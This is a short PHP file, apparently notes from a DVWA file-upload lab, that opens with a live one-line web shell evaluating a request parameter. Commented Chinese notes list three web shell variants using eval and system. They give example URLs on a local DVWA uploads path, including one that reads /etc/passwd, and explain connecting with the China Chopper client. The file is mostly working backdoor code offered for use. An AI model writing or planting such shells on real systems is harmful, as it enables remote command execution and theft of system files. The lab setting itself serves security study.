<?php eval($_REQUEST['cmd']);?>


//shell1    <?php @eval($_POST['yange']);?>
//设置菜刀url    http://192.168.218.128/dvwa/hackable/uploads/shell2.php,之后菜刀访问.
//shell2    <?php eval($_REQUEST['cmd']);?>
/*http://192.168.218.128/dvwa/hackable/uploads/shell2.php?cmd=phpinfo();*/
//其中cmd是输入的关键字,REQUEST是网页输入变量访问
//POST是使用菜刀类工具连接,c/s架构

//shell3   <?php system($_REQUEST['yange']);?>
/* http://192.168.218.128/dvwa/hackable/uploads/shell3.php?yange=cat /etc/passwd */
//shell3是使用linux命令方式,直接关键字yange匹配命令即可
//主要是函数eval和system之间区别,eval只能调用php自己的函数,system调用linux命令